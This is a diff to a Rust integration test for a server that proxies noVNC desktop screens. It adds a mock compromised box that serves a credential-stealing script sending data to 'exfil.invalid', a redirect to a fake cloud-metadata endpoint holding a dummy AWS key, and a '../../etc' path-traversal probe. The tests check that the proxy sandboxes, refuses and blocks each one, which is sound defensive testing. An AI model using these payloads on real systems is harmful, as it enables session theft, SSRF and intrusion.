@@ -11,12 +11,18 @@
 //! remote webview does: load the page with no Authorization header, open the websocket, and
 //! trade bytes; and what a stranger with the URL of a different coworker cannot do.
 //!
+//! The box is also hostile here, because it can be: it answers one page with script that would
+//! use the signed-in person's cookie if it ran on this origin, and another with a redirect to a
+//! decoy standing in for cloud metadata. What is asserted is that every file comes back sandboxed
+//! into an opaque origin, and that the decoy is never dialled.
+//!
 //! Needs Postgres; skips loudly without OG_DATABASE_URL. No Docker daemon.
 
 #![allow(clippy::expect_used, clippy::panic, clippy::unwrap_used)]
 
 use std::collections::BTreeMap;
-use std::sync::Arc;
+use std::sync::atomic::{AtomicUsize, Ordering};
+use std::sync::{Arc, Mutex};
 
 use async_trait::async_trait;
 use opengrok_box::{BoxResult, CommandOutput, Computer, StartedCommand};
@@ -119,9 +125,38 @@ async fn read_head(stream: &mut tokio::net::TcpStream) -> (String, Vec<u8>) {
     }
 }
 
+/// noVNC's page, as far as the proxy can tell.
+const NOVNC_PAGE: &str =
+    "<!DOCTYPE html><html><head><title>noVNC</title></head>novnc-stand-in</html>";
+
+/// What a box that was taken over serves as a page: script that acts as whoever opens it.
+const HOSTILE: &str = "<script>fetch('/coworkers',{credentials:'include'})\
+.then(r=>r.text()).then(t=>new WebSocket('ws://exfil.invalid/'+btoa(t)))</script>";
+
+/// A listener standing in for cloud metadata or an internal service a redirect could point at.
+/// It counts every connection it is ever offered.
+async fn start_decoy() -> (u16, Arc<AtomicUsize>) {
+    let listener = tokio::net::TcpListener::bind("127.0.0.1:0")
+        .await
+        .expect("bind");
+    let port = listener.local_addr().expect("addr").port();
+    let hits = Arc::new(AtomicUsize::new(0));
+    let counted = hits.clone();
+    tokio::spawn(async move {
+        while let Ok((mut stream, _)) = listener.accept().await {
+            counted.fetch_add(1, Ordering::SeqCst);
+            let _ = stream
+                .write_all(b"HTTP/1.1 200 OK\r\nContent-Length: 12\r\n\r\nAKIA-SECRET!")
+                .await;
+        }
+    });
+    (port, hits)
+}
+
 /// noVNC as websockify serves it: the page over HTTP, and a websocket on `/websockify` that
-/// speaks first and then echoes.
-async fn start_novnc() -> u16 {
+/// speaks first and then echoes. Plus what a hostile box adds: a page of script, and a redirect
+/// to `decoy`. Every request line it is sent is kept in `saw`.
+async fn start_novnc(decoy: u16, saw: Arc<Mutex<Vec<String>>>) -> u16 {
     let listener = tokio::net::TcpListener::bind("127.0.0.1:0")
         .await
         .expect("bind");
@@ -131,8 +166,12 @@ async fn start_novnc() -> u16 {
             let Ok((mut stream, _)) = listener.accept().await else {
                 return;
             };
+            let saw = saw.clone();
             tokio::spawn(async move {
                 let (head, _) = read_head(&mut stream).await;
+                saw.lock()
+                    .expect("saw")
+                    .push(head.lines().next().unwrap_or_default().to_string());
                 if head.to_ascii_lowercase().contains("upgrade: websocket") {
                     assert!(head.starts_with("GET /websockify "), "{head}");
                     let key = head
@@ -154,12 +193,22 @@ async fn start_novnc() -> u16 {
                         let _ = stream.write_all(&chunk[..read]).await;
                     }
                 }
-                let body = if head.starts_with("GET /vnc.html ") {
-                    "novnc-stand-in"
+                if head.starts_with("GET /moved.html ") {
+                    let reply = format!(
+                        "HTTP/1.1 302 Found\r\nLocation: http://127.0.0.1:{decoy}/latest/meta-data/\r\n\
+                         Content-Length: 0\r\nConnection: close\r\n\r\n"
+                    );
+                    let _ = stream.write_all(reply.as_bytes()).await;
+                    return;
+                }
+                let (body, kind) = if head.starts_with("GET /vnc.html ") {
+                    (NOVNC_PAGE, "text/html")
                 } else if head.starts_with("GET /app/ui.js ") {
-                    "ui-script"
+                    ("ui-script", "text/javascript")
+                } else if head.starts_with("GET /hostile.html ") {
+                    (HOSTILE, "text/html")
                 } else {
-                    ""
+                    ("", "text/html")
                 };
                 let status = if body.is_empty() {
                     "404 Not Found"
@@ -167,7 +216,7 @@ async fn start_novnc() -> u16 {
                     "200 OK"
                 };
                 let reply = format!(
-                    "HTTP/1.1 {status}\r\nContent-Type: text/html\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{body}",
+                    "HTTP/1.1 {status}\r\nContent-Type: {kind}\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{body}",
                     body.len()
                 );
                 let _ = stream.write_all(reply.as_bytes()).await;
@@ -219,6 +268,8 @@ struct Harness {
     port: u16,
     state: AgUiState,
     client: reqwest::Client,
+    decoy_hits: Arc<AtomicUsize>,
+    box_saw: Arc<Mutex<Vec<String>>>,
 }
 
 async fn harness(database_url: &str) -> Harness {
@@ -230,7 +281,9 @@ async fn harness(database_url: &str) -> Harness {
     opengrok_store::migrations::run(&pool)
         .await
         .expect("migrations");
-    let novnc = start_novnc().await;
+    let (decoy, decoy_hits) = start_decoy().await;
+    let box_saw = Arc::new(Mutex::new(Vec::new()));
+    let novnc = start_novnc(decoy, box_saw.clone()).await;
     let state = AgUiState {
         auth: AuthState::new(
             PgStore::new(pool),
@@ -263,6 +316,8 @@ async fn harness(database_url: &str) -> Harness {
         port,
         state,
         client: reqwest::Client::new(),
+        decoy_hits,
+        box_saw,
     }
 }
 
@@ -322,6 +377,33 @@ impl Harness {
             response.text().await.expect("text"),
         )
     }
+
+    /// A GET whose path is sent byte for byte. reqwest normalises `..` away before a request
+    /// leaves, so a probe through it never reaches the server's own check.
+    async fn raw_get(&self, path: &str) -> String {
+        let mut socket = tokio::net::TcpStream::connect(("127.0.0.1", self.port))
+            .await
+            .expect("dial");
+        let hello = format!(
+            "GET {path} HTTP/1.1\r\nHost: 127.0.0.1:{}\r\nConnection: close\r\n\r\n",
+            self.port
+        );
+        socket.write_all(hello.as_bytes()).await.expect("hello");
+        let mut reply = Vec::new();
+        socket.read_to_end(&mut reply).await.expect("reply");
+        String::from_utf8_lossy(&reply).into_owned()
+    }
+
+    /// The path under the ticket for `coworker`'s screen, as the owner's `vncUrl` names it.
+    async fn ticket_path(&self, token: &str, coworker: &str) -> String {
+        let (status, screen) = self.screen(token, coworker).await;
+        assert_eq!(status, 200, "{screen}");
+        let vnc = screen["vncUrl"].as_str().expect("a live screen");
+        let (page, _) = vnc.split_once('?').expect("settings");
+        page.strip_suffix("/vnc.html")
+            .expect("the page")
+            .to_string()
+    }
 }
 
 #[tokio::test]
@@ -371,8 +453,19 @@ async fn the_screen_is_served_through_the_server_to_its_owner_only() {
         "noVNC must dial its socket here: {vnc}"
     );
 
-    // The page and its relative assets, with no header — the way a webview loads them.
-    assert_eq!(h.open(&vnc).await, (200, "novnc-stand-in".to_string()));
+    // The page and its relative assets, with no header — the way a webview loads them. The page
+    // gains one script, first in its head, standing in for the storage the sandbox takes away
+    // (noVNC before 1.5 died without it); a script file is passed on byte for byte.
+    let (status, page) = h.open(&vnc).await;
+    assert_eq!(status, 200, "{page}");
+    let shimmed = page
+        .strip_prefix("<!DOCTYPE html><html><head><script>")
+        .unwrap_or_else(|| panic!("the stand-in storage first in the head: {page}"));
+    assert!(shimmed.contains("localStorage"), "{page}");
+    assert!(
+        page.ends_with("</script><title>noVNC</title></head>novnc-stand-in</html>"),
+        "the rest of the page is untouched: {page}"
+    );
     assert_eq!(
         h.open(&format!("{ticket_path}/app/ui.js")).await,
         (200, "ui-script".to_string())
@@ -422,5 +515,115 @@ async fn the_screen_is_served_through_the_server_to_its_owner_only() {
     let crossed = ticket_path.replace(&coworker, &bobs);
     assert_eq!(h.open(&format!("{crossed}/vnc.html")).await.0, 404);
     // Climbing out of noVNC's own files is refused before the box is asked.
-    assert_eq!(h.open(&format!("{ticket_path}/app/../../etc")).await.0, 404);
+    let path = ticket_path.trim_start_matches(&h.base);
+    let climbed = h.raw_get(&format!("{path}/app/../../etc")).await;
+    assert!(climbed.starts_with("HTTP/1.1 404"), "{climbed}");
+    assert!(climbed.ends_with("no such file"), "{climbed}");
+    let saw = h.box_saw.lock().expect("saw").clone();
+    assert!(
+        saw.iter().all(|line| !line.contains("..")),
+        "the box must never be asked for a climbing path: {saw:?}"
+    );
+}
+
+#[tokio::test]
+async fn the_boxs_pages_are_sandboxed_and_its_redirects_never_followed() {
+    let database_url = database_or_skip!();
+    let h = harness(&database_url).await;
+    let ada = h.person().await;
+    let coworker = h.hire(&ada).await;
+    let ticket_path = h.ticket_path(&ada, &coworker).await;
+
+    // A box that was taken over serves script. It still arrives — noVNC is script, and the
+    // proxy cannot tell the two apart — but as a page in an opaque origin, which neither sends
+    // this origin's Lax cookies nor reads its answers.
+    let hostile = h
+        .client
+        .get(format!("{ticket_path}/hostile.html"))
+        .send()
+        .await
+        .expect("hostile");
+    assert_eq!(hostile.status().as_u16(), 200);
+    let headers = hostile.headers().clone();
+    let header = |name: &str| {
+        headers
+            .get(name)
+            .and_then(|value| value.to_str().ok())
+            .unwrap_or_default()
+            .to_string()
+    };
+    let csp = header("content-security-policy");
+    assert!(
+        csp.split(';').any(|directive| {
+            let mut tokens = directive.split_whitespace();
+            tokens.next() == Some("sandbox") && tokens.any(|token| token == "allow-scripts")
+        }),
+        "the box's page must be sandboxed with its scripts allowed: {csp:?}"
+    );
+    for escape in [
+        "allow-same-origin",
+        "allow-top-navigation",
+        "allow-popups",
+        "allow-forms",
+    ] {
+        assert!(
+            !csp.contains(escape),
+            "{escape} undoes the sandbox: {csp:?}"
+        );
+    }
+    assert_eq!(header("x-content-type-options"), "nosniff");
+    assert_eq!(
+        header("access-control-allow-origin"),
+        "*",
+        "noVNC's modules load by CORS from the opaque origin"
+    );
+    assert!(
+        header("access-control-allow-credentials").is_empty(),
+        "an opaque origin must never be handed a credentialed read"
+    );
+    assert_eq!(header("referrer-policy"), "no-referrer");
+    assert!(
+        header("set-cookie").is_empty(),
+        "nothing the box says reaches a cookie"
+    );
+    assert_eq!(header("content-type"), "text/html");
+    let body = hostile.text().await.expect("body");
+    assert!(body.ends_with(HOSTILE), "{body}");
+
+    // noVNC's own files carry the same confinement: the sandbox is on the path, not on a guess
+    // about which files are pages.
+    let script = h
+        .client
+        .get(format!("{ticket_path}/app/ui.js"))
+        .send()
+        .await
+        .expect("script");
+    assert_eq!(script.status().as_u16(), 200);
+    assert_eq!(
+        script
+            .headers()
+            .get("access-control-allow-origin")
+            .and_then(|value| value.to_str().ok()),
+        Some("*")
+    );
+
+    // A redirect is the box asking this host to fetch something for it. It is refused, and
+    // the decoy it named is never dialled.
+    let (status, body) = h.open(&format!("{ticket_path}/moved.html")).await;
+    assert_eq!(status, 502, "{body}");
+    assert!(body.contains("redirect"), "the refusal says why: {body}");
+    assert!(!body.contains("AKIA"), "{body}");
+    assert!(
+        h.box_saw
+            .lock()
+            .expect("saw")
+            .iter()
+            .any(|line| line.starts_with("GET /moved.html ")),
+        "the box was asked for the page"
+    );
+    assert_eq!(
+        h.decoy_hits.load(Ordering::SeqCst),
+        0,
+        "the redirect's target must never be fetched"
+    );
 }
